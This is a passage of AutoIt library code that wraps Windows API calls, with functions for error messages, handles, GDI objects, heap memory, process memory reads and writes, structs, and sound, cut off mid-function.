Global Const $vta_left = $ta_bottom
Global Const $vta_right = $ta_top
Global Const $udf_bgr = 1
Global Const $udf_rgb = 0
Global Const $mwt_identity = 1
Global Const $mwt_leftmultiply = 2
Global Const $mwt_rightmultiply = 3
Global Const $mwt_set = 4
Global Const $monitor_defaulttonearest = 2
Global Const $monitor_defaulttonull = 0
Global Const $monitor_defaulttoprimary = 1
Global Const $pt_bezierto = 4
Global Const $pt_lineto = 2
Global Const $pt_moveto = 6
Global Const $pt_closefigure = 1
#Region Global Variables and Constants
	Global Const $format_message_allocate_buffer = 256
	Global Const $format_message_ignore_inserts = 512
	Global Const $format_message_from_string = 1024
	Global Const $format_message_from_hmodule = 2048
	Global Const $format_message_from_system = 4096
	Global Const $format_message_argument_array = 8192
#EndRegion Global Variables and Constants

Func _winapi_beep($ifreq = 500, $iduration = 1000)
	Local $aresult = DllCall("kernel32.dll", "bool", "Beep", "dword", $ifreq, "dword", $iduration)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_formatmessage($iflags, $psource, $imessageid, $ilanguageid, ByRef $pbuffer, $isize, $varguments)
	Local $sbuffertype = "struct*"
	If IsString($pbuffer) Then $sbuffertype = "wstr"
	Local $aresult = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "struct*", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
	If $sbuffertype = "wstr" Then $pbuffer = $aresult[5]
	Return $aresult[0]
EndFunc

Func _winapi_geterrormessage($icode, $ilanguage = 0, Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $aret = DllCall("kernel32.dll", "dword", "FormatMessageW", "dword", 4096, "ptr", 0, "dword", $icode, "dword", $ilanguage, "wstr", "", "dword", 4096, "ptr", 0)
	If @error OR NOT $aret[0] Then Return SetError(@error, @extended, "")
	Return SetError($_icurrenterror, $_icurrentextended, StringRegExpReplace($aret[5], "[" & @LF & "," & @CR & "]*\Z", ""))
EndFunc

Func _winapi_getlasterror(Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($_icurrenterror, $_icurrentextended, $aresult[0])
EndFunc

Func _winapi_getlasterrormessage(Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $ilasterror = _winapi_getlasterror()
	Local $tbufferptr = DllStructCreate("ptr")
	Local $ncount = _winapi_formatmessage(BitOR($format_message_allocate_buffer, $format_message_from_system), 0, $ilasterror, 0, $tbufferptr, 0, 0)
	If @error Then Return SetError(-@error, @extended, "")
	Local $stext = ""
	Local $pbuffer = DllStructGetData($tbufferptr, 1)
	If $pbuffer Then
		If $ncount > 0 Then
			Local $tbuffer = DllStructCreate("wchar[" & ($ncount + 1) & "]", $pbuffer)
			$stext = DllStructGetData($tbuffer, 1)
			If StringRight($stext, 2) = @CRLF Then $stext = StringTrimRight($stext, 2)
		EndIf
		DllCall("kernel32.dll", "handle", "LocalFree", "handle", $pbuffer)
	EndIf
	Return SetError($_icurrenterror, $_icurrentextended, $stext)
EndFunc

Func _winapi_messagebeep($itype = 1)
	Local $isound
	Switch $itype
		Case 1
			$isound = 0
		Case 2
			$isound = 16
		Case 3
			$isound = 32
		Case 4
			$isound = 48
		Case 5
			$isound = 64
		Case Else
			$isound = -1
	EndSwitch
	Local $aresult = DllCall("user32.dll", "bool", "MessageBeep", "uint", $isound)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _winapi_msgbox($iflags, $stitle, $stext)
	BlockInput(0)
	MsgBox($iflags, $stitle, $stext & "      ")
EndFunc

Func _winapi_setlasterror($ierrorcode, Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
	Return SetError($_icurrenterror, $_icurrentextended, NULL )
EndFunc

Func _winapi_showerror($stext, $bexit = True)
	BlockInput(0)
	MsgBox($mb_systemmodal, "Error", $stext & "      ")
	If $bexit Then Exit
EndFunc

Func _winapi_showlasterror($stext = "", $babort = False, $ilanguage = 0, Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $serror
	Local $ilasterror = _winapi_getlasterror()
	While 1
		$serror = _winapi_geterrormessage($ilasterror, $ilanguage)
		If @error AND $ilanguage Then
			$ilanguage = 0
		Else
			ExitLoop
		EndIf
	WEnd
	If StringStripWS($stext, $str_stripleading + $str_striptrailing) Then
		$stext &= @CRLF & @CRLF
	Else
		$stext = ""
	EndIf
	_winapi_msgbox(BitOR(262144, BitShift(16, -2 * (NOT $ilasterror))), $ilasterror, $stext & $serror)
	If $ilasterror Then
		_winapi_setlasterror($ilasterror)
		If $babort Then
			Exit $ilasterror
		EndIf
	EndIf
	Return SetError($_icurrenterror, $_icurrentextended, 1)
EndFunc

Func _winapi_showmsg($stext)
	_winapi_msgbox($mb_systemmodal, "Information", $stext)
EndFunc

Func __comerrorformating(ByRef $ocomerror, $sprefix = @TAB)
	Local Const $str_striptrailing = 2
	Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror.scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror.number, 8) & " (" & $ocomerror.number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror.windescription, $str_striptrailing) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror.description, $str_striptrailing) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror.source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror.helpfile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror.helpcontext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror.lastdllerror & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror.retcode)
	Return $serror
EndFunc

#Region Global Variables and Constants
	Global Const $duplicate_close_source = 1
	Global Const $duplicate_same_access = 2
	Global Const $obj_bitmap = 7
	Global Const $obj_brush = 2
	Global Const $obj_colorspace = 14
	Global Const $obj_dc = 3
	Global Const $obj_enhmetadc = 12
	Global Const $obj_enhmetafile = 13
	Global Const $obj_extpen = 11
	Global Const $obj_font = 6
	Global Const $obj_memdc = 10
	Global Const $obj_metadc = 4
	Global Const $obj_metafile = 9
	Global Const $obj_pal = 5
	Global Const $obj_pen = 1
	Global Const $obj_region = 8
	Global Const $null_brush = 5
	Global Const $null_pen = 8
	Global Const $black_brush = 4
	Global Const $dkgray_brush = 3
	Global Const $dc_brush = 18
	Global Const $gray_brush = 2
	Global Const $hollow_brush = $null_brush
	Global Const $ltgray_brush = 1
	Global Const $white_brush = 0
	Global Const $black_pen = 7
	Global Const $dc_pen = 19
	Global Const $white_pen = 6
	Global Const $ansi_fixed_font = 11
	Global Const $ansi_var_font = 12
	Global Const $device_default_font = 14
	Global Const $default_gui_font = 17
	Global Const $oem_fixed_font = 10
	Global Const $system_font = 13
	Global Const $system_fixed_font = 16
	Global Const $default_palette = 15
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_closehandle($hobject)
		Local $aresult = DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobject)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_deleteobject($hobject)
		Local $aresult = DllCall("gdi32.dll", "bool", "DeleteObject", "handle", $hobject)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_duplicatehandle($hsourceprocesshandle, $hsourcehandle, $htargetprocesshandle, $idesiredaccess, $iinherithandle, $ioptions)
		Local $aresult = DllCall("kernel32.dll", "bool", "DuplicateHandle", "handle", $hsourceprocesshandle, "handle", $hsourcehandle, "handle", $htargetprocesshandle, "handle*", 0, "dword", $idesiredaccess, "bool", $iinherithandle, "dword", $ioptions)
		If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, 0)
		Return $aresult[4]
	EndFunc

	Func _winapi_getcurrentobject($hdc, $itype)
		Local $aret = DllCall("gdi32.dll", "handle", "GetCurrentObject", "handle", $hdc, "uint", $itype)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getcurrentprocess()
		Local $aresult = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getobject($hobject, $isize, $pobject)
		Local $aresult = DllCall("gdi32.dll", "int", "GetObjectW", "handle", $hobject, "int", $isize, "struct*", $pobject)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_getobjectinfobyhandle($hobject)
		Local $tagpublic_object_basic_information = "ulong Attributes;ulong GrantedAcess;ulong HandleCount;ulong PointerCount;ulong Reserved[10]"
		Local $tpobi = DllStructCreate($tagpublic_object_basic_information)
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryObject", "handle", $hobject, "uint", 0, "struct*", $tpobi, "ulong", DllStructGetSize($tpobi), "ptr", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Local $aresult[4]
		For $i = 0 To 3
			$aresult[$i] = DllStructGetData($tpobi, $i + 1)
		Next
		Return $aresult
	EndFunc

	Func _winapi_getobjectnamebyhandle($hobject)
		Local $tagunicode_string = "struct;ushort Length;ushort MaximumLength;ptr Buffer;endstruct"
		Local $tagpublic_object_type_information = "struct;" & $tagunicode_string & ";ulong Reserved[22];endstruct"
		Local $tpoti = DllStructCreate($tagpublic_object_type_information & ";byte[32]")
		Local $aret = DllCall("ntdll.dll", "long", "ZwQueryObject", "handle", $hobject, "uint", 2, "struct*", $tpoti, "ulong", DllStructGetSize($tpoti), "ulong*", 0)
		If @error Then Return SetError(@error, @extended, "")
		If $aret[0] Then Return SetError(10, $aret[0], "")
		Local $pdata = DllStructGetData($tpoti, 3)
		If NOT $pdata Then Return SetError(11, 0, "")
		Return _winapi_getstring($pdata)
	EndFunc

	Func _winapi_getobjecttype($hobject)
		Local $aret = DllCall("gdi32.dll", "dword", "GetObjectType", "handle", $hobject)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_getstdhandle($istdhandle)
		If $istdhandle < 0 OR $istdhandle > 2 Then Return SetError(2, 0, -1)
		Local Const $ahandle[3] = [-10, -11, -12]
		Local $aresult = DllCall("kernel32.dll", "handle", "GetStdHandle", "dword", $ahandle[$istdhandle])
		If @error Then Return SetError(@error, @extended, -1)
		Return $aresult[0]
	EndFunc

	Func _winapi_getstockobject($iobject)
		Local $aresult = DllCall("gdi32.dll", "handle", "GetStockObject", "int", $iobject)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_selectobject($hdc, $hgdiobj)
		Local $aresult = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_sethandleinformation($hobject, $imask, $iflags)
		Local $aresult = DllCall("kernel32.dll", "bool", "SetHandleInformation", "handle", $hobject, "dword", $imask, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

#EndRegion Public Functions
#Region Global Variables and Constants
	Global $__g_hheap = 0
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_createbuffer($ilength, $pbuffer = 0, $babort = True)
		$pbuffer = __heaprealloc($pbuffer, $ilength, 0, $babort)
		If @error Then Return SetError(@error, @extended, 0)
		Return $pbuffer
	EndFunc

	Func _winapi_createbufferfromstruct($tstruct, $pbuffer = 0, $babort = True)
		If NOT IsDllStruct($tstruct) Then Return SetError(1, 0, 0)
		$pbuffer = __heaprealloc($pbuffer, DllStructGetSize($tstruct), 0, $babort)
		If @error Then Return SetError(@error + 100, @extended, 0)
		_winapi_movememory($pbuffer, $tstruct, DllStructGetSize($tstruct))
		Return $pbuffer
	EndFunc

	Func _winapi_createstring($sstring, $pstring = 0, $ilength = -1, $bunicode = True, $babort = True)
		$ilength = Number($ilength)
		If $ilength >= 0 Then
			$sstring = StringLeft($sstring, $ilength)
		Else
			$ilength = StringLen($sstring)
		EndIf
		Local $isize = $ilength + 1
		If $bunicode Then
			$isize *= 2
		EndIf
		$pstring = __heaprealloc($pstring, $isize, 0, $babort)
		If @error Then Return SetError(@error, @extended, 0)
		DllStructSetData(DllStructCreate(($bunicode ? "wchar" : "char") & "[" & ($ilength + 1) & "]", $pstring), 1, $sstring)
		Return SetExtended($ilength, $pstring)
	EndFunc

	Func _winapi_equalmemory($psource1, $psource2, $ilength)
		If _winapi_isbadreadptr($psource1, $ilength) Then Return SetError(11, @extended, 0)
		If _winapi_isbadreadptr($psource2, $ilength) Then Return SetError(12, @extended, 0)
		Local $aret = DllCall("ntdll.dll", "ulong_ptr", "RtlCompareMemory", "struct*", $psource1, "struct*", $psource2, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return Number($aret[0] = $ilength)
	EndFunc

	Func _winapi_fillmemory($pmemory, $ilength, $ivalue = 0)
		If _winapi_isbadwriteptr($pmemory, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlFillMemory", "struct*", $pmemory, "ulong_ptr", $ilength, "byte", $ivalue)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_freememory($pmemory)
		If NOT __heapfree($pmemory, 1) Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_getmemorysize($pmemory)
		Local $iresult = __heapsize($pmemory, 1)
		If @error Then Return SetError(@error, @extended, 0)
		Return $iresult
	EndFunc

	Func _winapi_globalmemorystatus()
		Local Const $tagmemorystatusex = "dword Length;dword MemoryLoad;" & "uint64 TotalPhys;uint64 AvailPhys;uint64 TotalPageFile;uint64 AvailPageFile;" & "uint64 TotalVirtual;uint64 AvailVirtual;uint64 AvailExtendedVirtual"
		Local $tmem = DllStructCreate($tagmemorystatusex)
		DllStructSetData($tmem, 1, DllStructGetSize($tmem))
		Local $aret = DllCall("kernel32.dll", "bool", "GlobalMemoryStatusEx", "struct*", $tmem)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $amem[7]
		$amem[0] = DllStructGetData($tmem, 2)
		$amem[1] = DllStructGetData($tmem, 3)
		$amem[2] = DllStructGetData($tmem, 4)
		$amem[3] = DllStructGetData($tmem, 5)
		$amem[4] = DllStructGetData($tmem, 6)
		$amem[5] = DllStructGetData($tmem, 7)
		$amem[6] = DllStructGetData($tmem, 8)
		Return $amem
	EndFunc

	Func _winapi_isbadcodeptr($paddress)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadCodePtr", "struct*", $paddress)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isbadreadptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadReadPtr", "struct*", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isbadstringptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadStringPtr", "struct*", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isbadwriteptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadWritePtr", "struct*", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_ismemory($pmemory)
		Local $bresult = __heapvalidate($pmemory)
		Return SetError(@error, @extended, $bresult)
	EndFunc

	Func _winapi_localfree($hmemory)
		Local $aresult = DllCall("kernel32.dll", "handle", "LocalFree", "handle", $hmemory)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_movememory($pdestination, $psource, $ilength)
		If _winapi_isbadreadptr($psource, $ilength) Then Return SetError(10, @extended, 0)
		If _winapi_isbadwriteptr($pdestination, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlMoveMemory", "struct*", $pdestination, "struct*", $psource, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_readprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iread)
		Local $aresult = DllCall("kernel32.dll", "bool", "ReadProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, "struct*", $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
		If @error Then Return SetError(@error, @extended, False)
		$iread = $aresult[5]
		Return $aresult[0]
	EndFunc

	Func _winapi_writeprocessmemory($hprocess, $pbaseaddress, $pbuffer, $isize, ByRef $iwritten, $sbuffer = "ptr")
		Local $aresult = DllCall("kernel32.dll", "bool", "WriteProcessMemory", "handle", $hprocess, "ptr", $pbaseaddress, $sbuffer, $pbuffer, "ulong_ptr", $isize, "ulong_ptr*", 0)
		If @error Then Return SetError(@error, @extended, False)
		$iwritten = $aresult[5]
		Return $aresult[0]
	EndFunc

	Func _winapi_zeromemory($pmemory, $ilength)
		If _winapi_isbadwriteptr($pmemory, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlZeroMemory", "struct*", $pmemory, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __heapalloc($isize, $babort = False)
		Local $aret
		If NOT $__g_hheap Then
			$aret = DllCall("kernel32.dll", "handle", "HeapCreate", "dword", 0, "ulong_ptr", 0, "ulong_ptr", 0)
			If @error OR NOT $aret[0] Then __fatalexit(1, "Error allocating memory.")
			$__g_hheap = $aret[0]
		EndIf
		$aret = DllCall("kernel32.dll", "ptr", "HeapAlloc", "handle", $__g_hheap, "dword", 8, "ulong_ptr", $isize)
		If @error OR NOT $aret[0] Then
			If $babort Then __fatalexit(1, "Error allocating memory.")
			Return SetError(@error + 30, @extended, 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func __heapfree(ByRef $pmemory, $bcheck = False, $icurerr = @error, $icurext = @extended)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "int", "HeapFree", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR NOT $aret[0] Then Return SetError(@error + 40, @extended, 0)
		$pmemory = 0
		Return SetError($icurerr, $icurext, 1)
	EndFunc

	Func __heaprealloc($pmemory, $isize, $bamount = False, $babort = False)
		Local $aret, $pret
		If __heapvalidate($pmemory) Then
			If $bamount AND (__heapsize($pmemory) >= $isize) Then Return SetExtended(1, Ptr($pmemory))
			$aret = DllCall("kernel32.dll", "ptr", "HeapReAlloc", "handle", $__g_hheap, "dword", 8, "ptr", $pmemory, "ulong_ptr", $isize)
			If @error OR NOT $aret[0] Then
				If $babort Then __fatalexit(1, "Error allocating memory.")
				Return SetError(@error + 20, @extended, Ptr($pmemory))
			EndIf
			$pret = $aret[0]
		Else
			$pret = __heapalloc($isize, $babort)
			If @error Then Return SetError(@error, @extended, 0)
		EndIf
		Return $pret
	EndFunc

	Func __heapsize($pmemory, $bcheck = False)
		If $bcheck AND (NOT __heapvalidate($pmemory)) Then Return SetError(@error, @extended, 0)
		Local $aret = DllCall("kernel32.dll", "ulong_ptr", "HeapSize", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error OR ($aret[0] = Ptr(-1)) Then Return SetError(@error + 50, @extended, 0)
		Return $aret[0]
	EndFunc

	Func __heapvalidate($pmemory)
		If (NOT $__g_hheap) OR (NOT Ptr($pmemory)) Then Return SetError(9, 0, False)
		Local $aret = DllCall("kernel32.dll", "int", "HeapValidate", "handle", $__g_hheap, "dword", 0, "ptr", $pmemory)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

#EndRegion Internal Functions
Global Const $snd_application = 128
Global Const $snd_alias = 65536
Global Const $snd_alias_id = 1114112
Global Const $snd_async = 1
Global Const $snd_filename = 131072
Global Const $snd_loop = 8
Global Const $snd_memory = 4
Global Const $snd_nodefault = 2
Global Const $snd_nostop = 16
Global Const $snd_nowait = 8192
Global Const $snd_purge = 64
Global Const $snd_resource = 262148
Global Const $snd_sentry = 524288
Global Const $snd_sync = 0
Global Const $snd_system = 2097152
Global Const $snd_system_nostop = 2097168
Global Const $snd_alias_systemasterisk = "SystemAsterisk"
Global Const $snd_alias_systemdefault = "SystemDefault"
Global Const $snd_alias_systemexclamation = "SystemExclamation"
Global Const $snd_alias_systemexit = "SystemExit"
Global Const $snd_alias_systemhand = "SystemHand"
Global Const $snd_alias_systemquestion = "SystemQuestion"
Global Const $snd_alias_systemstart = "SystemStart"
Global Const $snd_alias_systemwelcome = "SystemWelcome"
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_arraytostruct(Const ByRef $adata, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($adata, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "wchar[" & (StringLen($adata[$i]) + 1) & "];"
		Next
		Local $tdata = DllStructCreate($tagstruct & "wchar[1]")
		Local $icount = 1
		For $i = $istart To $iend
			DllStructSetData($tdata, $icount, $adata[$i])
			$icount += 1
		Next
		DllStructSetData($tdata, $icount, ChrW(0))
		Return $tdata
	EndFunc

	Func _winapi_createmargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
		Local $tmargins = DllStructCreate($tagmargins)
		DllStructSetData($tmargins, 1, $ileftwidth)
		DllStructSetData($tmargins, 2, $irightwidth)
		DllStructSetData($tmargins, 3, $itopheight)
		DllStructSetData($tmargins, 4, $ibottomheight)
		Return $tmargins
	EndFunc

	Func _winapi_createpoint($ix, $iy)
		Local $tpoint = DllStructCreate($tagpoint)
		DllStructSetData($tpoint, 1, $ix)
		DllStructSetData($tpoint, 2, $iy)
		Return $tpoint
	EndFunc

	Func _winapi_createrect($ileft, $itop, $iright, $ibottom)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ileft)
		DllStructSetData($trect, 2, $itop)
		DllStructSetData($trect, 3, $iright)
		DllStructSetData($trect, 4, $ibottom)
		Return $trect
	EndFunc

	Func _winapi_createrectex($ix, $iy, $iwidth, $iheight)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ix)
		DllStructSetData($trect, 2, $iy)
		DllStructSetData($trect, 3, $ix + $iwidth)
		DllStructSetData($trect, 4, $iy + $iheight)
		Return $trect
	EndFunc

	Func _winapi_createsize($iwidth, $iheight)
		Local $tsize = DllStructCreate($tagsize)
		DllStructSetData($tsize, 1, $iwidth)
		DllStructSetData($tsize, 2, $iheight)
		Return $tsize
	EndFunc

	Func _winapi_copystruct($tstruct, $sstruct = "")
		Local $isize = DllStructGetSize($tstruct)
		If NOT $isize Then Return SetError(1, 0, 0)
		Local $tresult
		If NOT StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
			$tresult = DllStructCreate("byte[" & $isize & "]")
		Else
			$tresult = DllStructCreate($sstruct)
		EndIf
		If DllStructGetSize($tresult) < $isize Then Return SetError(2, 0, 0)
		_winapi_movememory($tresult, $tstruct, $isize)
		Return $tresult
	EndFunc

	Func _winapi_getextended()
		Return $__g_vext
	EndFunc

	Func _winapi_getmousepos($btoclient = False, $hwnd = 0)
		Local $imode = Opt("MouseCoordMode", 1)
		Local $apos = MouseGetPos()
		Opt("MouseCoordMode", $imode)
		Local $tpoint = DllStructCreate($tagpoint)
		DllStructSetData($tpoint, "X", $apos[0])
		DllStructSetData($tpoint, "Y", $apos[1])
		If $btoclient AND NOT _winapi_screentoclient($hwnd, $tpoint) Then Return SetError(@error + 20, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_getmouseposx($btoclient = False, $hwnd = 0)
		Local $tpoint = _winapi_getmousepos($btoclient, $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($tpoint, "X")
	EndFunc

	Func _winapi_getmouseposy($btoclient = False, $hwnd = 0)
		Local $tpoint = _winapi_getmousepos($btoclient, $hwnd)
		If @error Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($tpoint, "Y")
	EndFunc

	Func _winapi_muldiv($inumber, $inumerator, $idenominator)
		Local $aresult = DllCall("kernel32.dll", "int", "MulDiv", "int", $inumber, "int", $inumerator, "int", $idenominator)
		If @error Then Return SetError(@error, @extended, -1)
		Return $aresult[0]
	EndFunc

	Func _winapi_playsound($ssound, $iflags = $snd_system_nostop, $hinstance = 0)
		Local $stypeofsound = "ptr"
		If $ssound Then
			If IsString($ssound) Then
				$stypeofsound = "wstr"
			EndIf
		Else
			$ssound = 0
			$iflags = 0
		EndIf
		Local $aret = DllCall("winmm.dll", "bool", "PlaySoundW", $stypeofsound, $ssound, "handle", $hinstance, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_stringlena(Const ByRef $tstring)
		Local $aresult = DllCall("kernel32.dll", "int", "lstrlenA", "struct*", $tstring)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_stringlenw(Const ByRef $tstring)
		Local $aresult = DllCall("kernel32.dll", "int", "lstrlenW", "struct*", $tstring)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_structtoarray(ByRef $tstruct, $iitems = 0)
		Local $isize = 2 * Floor(DllStructGetSize($tstruct) / 2)
		Local $pstruct = DllStructGetPtr($tstruct)
		If NOT $isize OR NOT $pstruct Then Return SetError(1, 0, 0)
		Local $tdata, $ilength, $ioffset = 0
		Local $aresult[101] = [0]
		While 1
			$ilength = _winapi_strlen($pstruct + $ioffset)
			If NOT $ilength Then
				ExitLoop
			EndIf
			If 2 * (1 + $ilength) + $ioffset > $isize Then Return SetError(3, 0, 0)
			$tdata = DllStructCreate("wchar[" & (1 + $ilength) & "]", $pstruct + $ioffset)
			If @error Then Return SetError(@error + 10, 0, 0)
			__inc($aresult)
			$aresult[$aresult[0]] = DllStructGetData($tdata, 1)
			If $aresult[0] = $iitems Then
				ExitLoop
			EndIf
			$ioffset += 2 * (1 + $ilength)
			If $ioffset >= $isize Then Return SetError(3, 0, 0)
		WEnd
		If NOT $aresult[0] Then Return SetError(2, 0, 0)
		__inc($aresult, -1)
		Return $aresult
	EndFunc

	Func _winapi_unionstruct($tstruct1, $tstruct2, $sstruct = "")
		Local $asize[2] = [DllStructGetSize($tstruct1), DllStructGetSize($tstruct2)]
		If NOT $asize[0] OR NOT $asize[1] Then Return SetError(1, 0, 0)
		Local $tresult
		If NOT StringStripWS($sstruct, $str_stripleading + $str_striptrailing + $str_stripspaces) Then
			$tresult = DllStructCreate("byte[" & ($asize[0] + $asize[1]) & "]")
		Else
			$tresult = DllStructCreate($sstruct)
		EndIf
		If DllStructGetSize($tresult) < ($asize[0] + $asize[1]) Then Return SetError(2, 0, 0)
		_winapi_movememory($tresult, $tstruct1, $asize[0])
		_winapi_movememory(DllStructGetPtr($tresult) + $asize[0], $tstruct2, $asize[1])
		Return $tresult
	EndFunc

#EndRegion Public Functions
#Region Global Variables and Constants
	Global Const $tagbitmap = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
	Global Const $tagbitmapv5header = "struct;dword bV5Size;long bV5Width;long bV5Height;ushort bV5Planes;ushort bV5BitCount;dword bV5Compression;dword bV5SizeImage;long bV5XPelsPerMeter;long bV5YPelsPerMeter;dword bV5ClrUsed;dword bV5ClrImportant;dword bV5RedMask;dword bV5GreenMask;dword bV5BlueMask;dword bV5AlphaMask;dword bV5CSType;int bV5Endpoints[9];dword bV5GammaRed;dword bV5GammaGreen;dword bV5GammaBlue;dword bV5Intent;dword bV5ProfileData;dword bV5ProfileSize;dword bV5Reserved;endstruct"
	Global Const $tagdibsection = $tagbitmap & ";" & $tagbitmapinfoheader & ";dword dsBitfields[3];ptr dshSection;dword dsOffset"
	Global Const $tmpf_fixed_pitch = 1
	Global Const $tmpf_vector = 2
	Global Const $tmpf_truetype = 4
	Global Const $tmpf_device = 8
	Global Const $__winapiconstant_fw_normal = 400
	Global Const $__winapiconstant_default_charset = 1
	Global Const $__winapiconstant_out_default_precis = 0
	Global Const $__winapiconstant_clip_default_precis = 0
	Global Const $__winapiconstant_default_quality = 0
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_bitblt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
		Local $aresult = DllCall("gdi32.dll", "bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_combinergn($hrgndest, $hrgnsrc1, $hrgnsrc2, $icombinemode)
